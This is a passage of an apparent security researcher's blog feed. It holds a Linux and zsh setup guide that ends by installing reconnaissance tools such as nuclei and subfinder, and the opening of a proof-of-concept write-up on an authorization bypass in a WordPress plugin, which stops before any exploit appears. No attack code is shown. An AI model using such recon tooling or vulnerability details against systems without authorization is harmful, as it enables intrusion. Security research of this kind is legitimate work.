start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Extract and install&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;tar -xvzf hugo_extended_*_linux-amd64.tar.gz&#xA;sudo mv hugo /usr/local/bin/&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;remove-underline-in-zsh&#34;&gt;&lt;span&gt;Remove Underline in Zsh&lt;/span&gt;&#xA;  &lt;a href=&#34;#remove-underline-in-zsh&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;(( ${&amp;#43;ZSH_HIGHLIGHT_STYLES} )) || typeset -A ZSH_HIGHLIGHT_STYLES&#xA;ZSH_HIGHLIGHT_STYLES[path]=none&#xA;ZSH_HIGHLIGHT_STYLES[path_prefix]=none&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Change all &lt;code&gt;underline&lt;/code&gt; to &lt;code&gt;none&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;-ZSH_HIGHLIGHT_STYLES[unknown-token]=underline&#xA;&amp;#43;ZSH_HIGHLIGHT_STYLES[unknown-token]=none&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;eza-for-ls-output&#34;&gt;&lt;span&gt;&lt;code&gt;eza&lt;/code&gt; for &lt;code&gt;ls&lt;/code&gt; output&lt;/span&gt;&#xA;  &lt;a href=&#34;#eza-for-ls-output&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Install&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt install eza&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Configure&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;alias ls=&amp;#39;eza --group-directories-first&amp;#39;&#xA;alias ll=&amp;#39;eza -lah --group-directories-first&amp;#39;&#xA;alias la=&amp;#39;eza -a --group-directories-first&amp;#39;&#xA;alias lt=&amp;#39;eza --tree --group-directories-first&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;grc-for-color-output&#34;&gt;&lt;span&gt;&lt;code&gt;grc&lt;/code&gt; for Color Output&lt;/span&gt;&#xA;  &lt;a href=&#34;#grc-for-color-output&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Install&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt install grc -y&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Configure&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;# Auto alias commands supported by grc (except ls)&#xA;if command -v grc &amp;gt;/dev/null; then&#xA;  for f in /usr/share/grc/conf.*; do&#xA;    cmd=&amp;#34;${f##*/conf.}&amp;#34;  &#xA;    [ &amp;#34;$cmd&amp;#34; = &amp;#34;ls&amp;#34; ] &amp;amp;&amp;amp; continue&#xA;    alias &amp;#34;$cmd=grc $cmd&amp;#34;&#xA;  done&#xA;fi&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;fzf--fuzzy-finder&#34;&gt;&lt;span&gt;&lt;code&gt;fzf&lt;/code&gt; – fuzzy finder&lt;/span&gt;&#xA;  &lt;a href=&#34;#fzf--fuzzy-finder&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt install fzf&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;bat-for-reading-files&#34;&gt;&lt;span&gt;&lt;code&gt;bat&lt;/code&gt; for Reading Files&lt;/span&gt;&#xA;  &lt;a href=&#34;#bat-for-reading-files&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Install&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt install bat&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Configure&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;alias bat=&amp;#34;batcat&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;font&#34;&gt;&lt;span&gt;Font&lt;/span&gt;&#xA;  &lt;a href=&#34;#font&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt install fonts-firacode fonts-jetbrains-mono&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;some-alias&#34;&gt;&lt;span&gt;Some alias&lt;/span&gt;&#xA;  &lt;a href=&#34;#some-alias&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;alias ports=&amp;#39;ss -tulnp&amp;#39;&#xA;alias myip=&amp;#39;ip a | grep inet&amp;#39;&#xA;alias serve=&amp;#39;python3 -m http.server&amp;#39;&#xA;alias cls=&amp;#39;clear&amp;#39;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;golang&#34;&gt;&lt;span&gt;Golang&lt;/span&gt;&#xA;  &lt;a href=&#34;#golang&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;Tải&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;sudo apt install golang-go -y&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;strong&gt;Cấu hình&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;nano ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;export PATH=&amp;#34;$HOME/go/bin:$PATH&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;source ~/.zshrc&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;some-tool-from-project-discovery&#34;&gt;&lt;span&gt;Some Tool from Project Discovery&lt;/span&gt;&#xA;  &lt;a href=&#34;#some-tool-from-project-discovery&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&lt;code&gt;nuclei&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;nuclei -update-templates&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;httpx&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;subfinder&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;dnsx&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;5&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;katana&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/katana/cmd/katana@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;6&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;assetfinder&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install github.com/tomnomnom/assetfinder@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;7&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;chaos-client&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/chaos-client/cmd/chaos@latest&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;8&#34;&gt;&#xA;&lt;li&gt;&lt;code&gt;uncover&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;go install -v github.com/projectdiscovery/uncover/cmd/uncover@latest&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;docker&#34;&gt;&lt;span&gt;Docker&lt;/span&gt;&#xA;  &lt;a href=&#34;#docker&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo apt install -y docker.io&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;sudo systemctl start docker  &lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;sudo usermod -aG docker $USER&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;sudo apt install docker-compose -y&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>CVE-2025-64283 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-12-24-cve-2025-64283/</link>
      <pubDate>Wed, 24 Dec 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-12-24-cve-2025-64283/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-12-24-cve-2025-64283/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;An &lt;strong&gt;Authorization Bypass&lt;/strong&gt; vulnerability through a &lt;strong&gt;User-Controlled Key&lt;/strong&gt; in &lt;strong&gt;Rometheme RTMKit (rometheme-for-elementor)&lt;/strong&gt; allows exploitation of &lt;strong&gt;incorrectly configured access control&lt;/strong&gt; mechanisms.&lt;br&gt;&#xA;This vulnerability affects &lt;strong&gt;RTMKit&lt;/strong&gt; from &lt;strong&gt;n/a&lt;/strong&gt; through &lt;strong&gt;version ≤ 1.6.7&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-64283&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-64283&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Insecure Direct Object References (IDOR)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.6.7&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.6.8&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (5.4)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/rometheme-for-elementor/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress ARTMKit Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version – ARTMKit&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;1.6.7&lt;/code&gt; – &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;1.6.8&lt;/code&gt; – &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; → &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; 